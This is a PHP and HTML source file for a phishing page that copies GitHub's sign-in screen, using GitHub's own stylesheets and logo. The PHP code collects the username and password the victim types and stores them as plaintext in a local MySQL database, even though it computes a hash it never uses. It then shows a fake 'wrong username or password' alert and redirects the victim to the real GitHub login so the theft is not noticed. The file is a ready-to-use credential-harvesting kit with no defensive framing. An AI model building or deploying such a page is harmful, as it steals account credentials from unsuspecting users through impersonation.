
<?php
if (isset($_POST['submit'])) {
    // Retrieve user input and sanitize
    $username = trim($_POST["username"]);
    $password = trim($_POST["password"]);

    // Validate inputs (you can add more complex validation as needed)
    if (empty($username) || empty($password)) {
        echo "Username and password are required.";
        exit;
    }

    // Hash the password before storing it
    $hashed_password = password_hash($password, PASSWORD_BCRYPT);

    // Create a MySQL connection
    $servername = "localhost";
    $dbname = "githublogin";
    $dbusername = "root";
    $dbpassword = "";

    $conn = new mysqli($servername, $dbusername, $dbpassword, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Insert user data into the 'users' table
    $sql = "INSERT INTO user (username, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);

    if ($stmt === false) {
        die("Error preparing statement: " . $conn->error);
    }

    $stmt->bind_param("ss", $username, $password);

    if ($stmt->execute()) {
      echo '<script>
      alert("wrong username or password");
      window.location.href = "https://github.com/login";
    </script>';
exit; // Stop further script execution
  } else {
      echo "Error saving user: " . $stmt->error;
  }
    // Close the connection
    $stmt->close();
    $conn->close();
}
?>
<!DOCTYPE html>
<html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true" data-turbo-loaded="">
    <head>
        <link rel="stylesheet" href="styles.css">
      <meta charset="utf-8">
    <link rel="icon" href="github_logo.png">
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-f552bab6ce72.css"><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-4589f64a2275.css"><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-a7246d2d6733.css"><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-f2ef05cef2f1.css"><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-daa1fe317131.css"><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-1ab6fcc64845.css"><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-46de871e876c.css"><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-c9754fef2a31.css"><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-dba748981a29.css">
      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-4cbeaa0795ef.css">
      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-87f353b17355.css">
      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-b169e665f6fa.css">
      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-f1af66156f94.css">

    <title>Sign in to GitHub · GitHub</title>

      <meta name="viewport" content="width=device-width">
    </head>
  
    <body class="logged-out env-production page-responsive session-authentication" style="word-wrap: break-word;">
      <div data-turbo-body="" class="logged-out env-production page-responsive session-authentication" style="word-wrap: break-word;">
        
  
  
      <div class="position-relative js-header-wrapper ">
        <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
  
          <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
    <div class="container clearfix width-full text-center">
      <a class="header-logo" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
        <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" data-view-component="true" class="octicon octicon-mark-github">
      <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
  </svg>
      </a>
    </div>
  </div>
      </div>
  
    <div id="start-of-content" class="show-on-focus"></div>
  
      <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>
  
    <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="">
        <main>
          
  
  <div class="auth-form px-3" id="login" data-hpc="">
  
      <div class="auth-form-header p-0">
        <h1>Sign in to GitHub</h1>
      </div>
  
      <div class="auth-form-body mt-3">
  
    <form  id="myForm" action="" accept-charset="UTF-8" method="post"> 
        <label for="login_field">
        Username or email address
      </label>
      <input type="text" id="username" name="username" class="form-control input-block js-login-field"  autofocus="autofocus" required="required">
  
    <div class="position-relative">
      <label for="password">
        Password
      </label>
      <input type="password" name="password" id="password"  class="form-control form-control input-block " required="required">
      <a class="label-link position-absolute top-0 right-0" id="forgot-password" href="/password_reset">Forgot password?</a>
      
  
      <input type="submit" class="btn btn-primary btn-block" value="Sign in" name="submit" >
     
    </div>
  </form>  
 
  
      </div>
     

  
          <h2 class="sr-only">Password login alternatives</h2>
          <div class="login-callout mt-3">
              <webauthn-subtle class="js-webauthn-subtle" data-catalyst="">
      <p class="mb-0 mt-0 js-webauthn-subtle-emu-control">
        <button data-action="click:webauthn-subtle#prompt" type="button" data-view-component="true" class="Button--link Button--medium Button">  <span class="Button-content">
      <span class="Button-label">Sign in with a passkey</span>
    </span>
  </button>
      </p>
    </webauthn-subtle>
  
            <p class="mt-1 mb-0 p-0">
              New to GitHub?
                <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="d943b5df3b8e74686b4009e60ef5e059ef46ba02071647af580daec2c03c709e" href="/signup?source=login">Create an account</a>
            </p>
          </div>
  
  </div>
  
        </main>
    </div>
  
            <div class="footer container-lg p-responsive py-6 mt-6 f6" role="contentinfo">
      <ul class="list-style-none d-flex flex-justify-center">
          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
          </li>
  
          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
          </li>
  
          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com" data-view-component="true" class="Link--secondary Link">Docs</a>
          </li>
  
          <li class="mx-2">
              <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com" data-view-component="true" class="Link--secondary Link">Contact GitHub Support</a>
          </li>
  
            <li class="mr-3">
    <cookie-consent-link data-catalyst="">
      <button type="button" class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent" data-action="click:cookie-consent-link#showConsentManagement">
        Manage cookies
      </button>
    </cookie-consent-link>
  </li>
  
  <li class="mr-3">
    <cookie-consent-link data-catalyst="">
      <button type="button" class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent" data-action="click:cookie-consent-link#showConsentManagement">
        Do not share my personal information
      </button>
    </cookie-consent-link>
  </li>
  
      </ul>
    </div>
  
  
      <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-initial-cookie-consent-allowed="" data-cookie-consent-required="false" data-catalyst=""></ghcc-consent>
  
  
    <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden="">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
      <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
  </svg>
      <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
      <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
  </svg>
      </button>
      You can’t perform that action at this time.
    </div>

  
  </body></html>